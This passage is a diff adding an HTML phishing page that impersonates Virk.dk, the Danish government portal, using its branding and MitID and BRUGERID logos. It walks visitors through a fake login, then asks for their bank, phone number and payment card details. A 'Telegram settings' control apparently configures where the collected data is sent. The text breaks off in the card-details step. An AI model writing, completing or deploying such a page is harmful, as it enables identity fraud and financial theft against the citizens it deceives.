@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Virk.dk – Forside</title>
+    <style>
+        :root {
+            --virk-blue: #003c71;
+            --virk-light-blue: #005792;
+            --virk-hover: #004175;
+            --virk-bg: #f5f5f5;
+            --virk-white: #ffffff;
+            --virk-gray: #e6e6e6;
+            --virk-dark: #333;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--virk-bg);
+            color: var(--virk-dark);
+            line-height: 1.6;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            background-color: var(--virk-blue);
+            color: white;
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .virk-logo {
+            height: 40px;
+            width: auto;
+            filter: brightness(0) invert(1); /* White version if original is dark */
+        }
+
+        nav {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        nav a {
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 0.95rem;
+            padding: 6px 10px;
+            border-radius: 4px;
+            transition: background-color 0.2s;
+            cursor: pointer;
+        }
+
+        nav a:hover {
+            background-color: var(--virk-hover);
+        }
+
+        main {
+            flex: 1;
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 0 20px;
+            width: 100%;
+        }
+
+        h1 {
+            color: var(--virk-blue);
+            margin-bottom: 20px;
+            font-size: 2rem;
+        }
+
+        p {
+            margin-bottom: 20px;
+        }
+
+        .step {
+            display: none;
+            background: var(--virk-white);
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        .step.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Hero */
+        .hero {
+            text-align: center;
+        }
+        .hero h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+        .btn-primary {
+            background-color: var(--virk-light-blue);
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 4px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 20px;
+            display: inline-block;
+        }
+        .btn-primary:hover {
+            background-color: var(--virk-hover);
+        }
+
+        /* Auth logos */
+        .auth-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 60px;
+            margin: 40px 0;
+        }
+        .auth-logo {
+            width: 180px;
+            height: auto;
+            animation: pulse 2s infinite;
+            cursor: pointer;
+            transition: transform 0.3s;
+        }
+        .auth-logo:hover {
+            transform: scale(1.1);
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.07); }
+        }
+
+        /* Form */
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        label {
+            font-weight: 600;
+            color: var(--virk-dark);
+        }
+        input, select {
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 1rem;
+            width: 100%;
+        }
+        input:focus, select:focus {
+            outline: none;
+            border-color: var(--virk-light-blue);
+            box-shadow: 0 0 0 2px rgba(0,87,146,0.2);
+        }
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .confirmation-box {
+            text-align: center;
+            padding: 20px;
+        }
+        .confirmation-box h1 {
+            color: #28a745;
+        }
+
+        footer {
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 15px;
+            font-size: 0.9rem;
+        }
+
+        /* Settings modal */
+        .settings-btn {
+            background: none;
+            border: none;
+            color: white;
+            cursor: pointer;
+            font-size: 1.2rem;
+            margin-left: 15px;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            max-width: 400px;
+            width: 100%;
+            position: relative;
+        }
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+        .modal h2 {
+            margin-bottom: 20px;
+        }
+        .modal input {
+            margin-bottom: 15px;
+        }
+        .modal button {
+            width: 100%;
+        }
+
+        @media (max-width: 600px) {
+            header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            nav {
+                margin-top: 15px;
+            }
+            main {
+                margin: 20px auto;
+            }
+            .auth-container {
+                flex-direction: column;
+                gap: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo-container">
+            <img src="https://www.virk.dk/-/media/project/brandguide/logos/virk-logo.svg" 
+                 alt="Virk Logo" class="virk-logo"
+                 onerror="this.style.display='none'">
+            <span style="font-size:1.5rem; font-weight:bold;">Virk.dk</span>
+        </div>
+        <nav>
+            <a onclick="showStep(0)">Forside</a>
+            <a onclick="showStep(1)">BRUGERID</a>
+            <a onclick="showStep(2)">Bankoplysninger</a>
+            <a onclick="showStep(3)">Kortoplysninger</a>
+            <button class="settings-btn" onclick="openSettings()" title="Telegram indstillinger">⚙️</button>
+        </nav>
+    </header>
+
+    <main>
+        <!-- Step 0: Frontpage -->
+        <div class="step active" id="step0">
+            <div class="hero">
+                <h1>Velkommen til Virk.dk</h1>
+                <p>Danmarks digitale indgang til det offentlige</p>
+                <button class="btn-primary" onclick="showStep(1)">Start her</button>
+            </div>
+        </div>
+
+        <!-- Step 1: BRUGERID & MITID -->
+        <div class="step" id="step1">
+            <h1>Log ind med BRUGERID eller MITID</h1>
+            <p>Vælg din foretrukne login-metode og klik for at fortsætte</p>
+            <div class="auth-container">
+                <img src="https://www.brugerid.gov.dk/-/media/project/brandguide/logos/brugerid-logo.svg" 
+                     alt="BRUGERID Logo" class="auth-logo" onclick="showStep(2)">
+                <img src="https://www.mitid.dk/-/media/project/brandguide/logos/mitid-logo.svg" 
+                     alt="MITID Logo" class="auth-logo" onclick="showStep(2)">
+            </div>
+        </div>
+
+        <!-- Step 2: Bank & Phone -->
+        <div class="step" id="step2">
+            <h1>Bankoplysninger</h1>
+            <p>Udfyld venligst dine bankoplysninger for at fortsætte.</p>
+            <form id="form-step2" onsubmit="event.preventDefault(); showStep(3);">
+                <div class="form-group">
+                    <label for="bank">Vælg din bank</label>
+                    <select id="bank" name="bank" required>
+                        <option value="" disabled selected>Vælg bank…</option>
+                        <option value="Danske Bank">Danske Bank</option>
+                        <option value="Nordea">Nordea</option>
+                        <option value="Jyske Bank">Jyske Bank</option>
+                        <option value="Swedbank">Swedbank</option>
+                        <option value="Nykredit">Nykredit</option>
+                        <option value="Arbejdernes Landsbank">Arbejdernes Landsbank</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="phone">Telefonnummer</label>
+                    <input type="tel" id="phone" name="phone" 
+                           pattern="^\+45\d{8}$" placeholder="+4512345678" required>
+                    <small>Format: +45 efterfulgt af 8 cifre</small>
+                </div>
+                <button type="submit" class="btn-primary">Næste</button>
+            </form>
+        </div>
+
+        <!-- Step 3: Card Info -->
+        <div class="step" id="step3">
+            <h1>Kortoplysninger</h1>
+            <p>Indtast dine kortoplysninger for at bekræfte din identitet.</p>
+           
